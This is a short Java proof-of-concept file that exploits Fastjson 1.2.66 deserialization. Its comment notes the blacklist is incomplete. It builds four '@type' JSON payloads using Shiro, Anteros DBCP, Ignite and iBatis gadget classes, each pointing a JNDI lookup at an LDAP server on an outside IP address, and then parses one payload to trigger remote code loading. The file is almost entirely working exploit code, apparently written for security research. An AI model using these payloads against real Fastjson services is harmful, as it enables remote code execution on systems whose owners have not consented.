import com.alibaba.fastjson.JSON;

/**
 * Created by xjj on 2023/3/9.
 */
public class FastJson8_LE1266 {
    // 黑名单不全
    public static void main(String[] args) {
        String ldap = "ldap://47.95.7.37:1389/Calc";
        String poc1 = String.format("{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"%s\"}", ldap);
        String poc2 = String.format("{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"%s\"}", ldap);
        String poc3 = String.format("{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":\"%s\"}", ldap);
        String poc4 = String.format("{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"%s\"}}", ldap);

        JSON.parseObject(poc1);
    }
}
